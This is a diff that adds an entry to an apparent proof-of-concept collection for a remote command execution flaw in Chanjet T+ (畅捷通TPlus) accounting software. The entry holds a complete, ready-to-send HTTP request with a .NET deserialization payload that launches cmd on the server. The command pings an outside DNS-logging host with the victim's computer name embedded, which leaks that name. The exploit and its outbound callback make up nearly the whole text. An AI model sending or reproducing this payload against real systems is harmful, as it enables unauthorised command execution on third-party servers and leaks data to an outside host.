@@ -1,0 +1,7 @@
+vendor = "畅捷通"
+name = "畅捷通TPlus 命令执行"
+type = "RCE"
+source = "TG"
+date = "08.15"
+poc = "POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Content-Type: text/plain Accept-Encoding: gzip, deflate X-Ajaxpro-Method: GetStoreWarehouseByStore Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 540 { \"storeID\":{ \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\", \"MethodName\":\"Start\", \"ObjectInstance\":{ \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\", \"StartInfo\":{ \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\", \"FileName\":\"cmd\", \"Arguments\":\"/c ping -n 3 %COMPUTERNAME%.shenglang.eyes.sh\" } } } }"
+label = "nday"
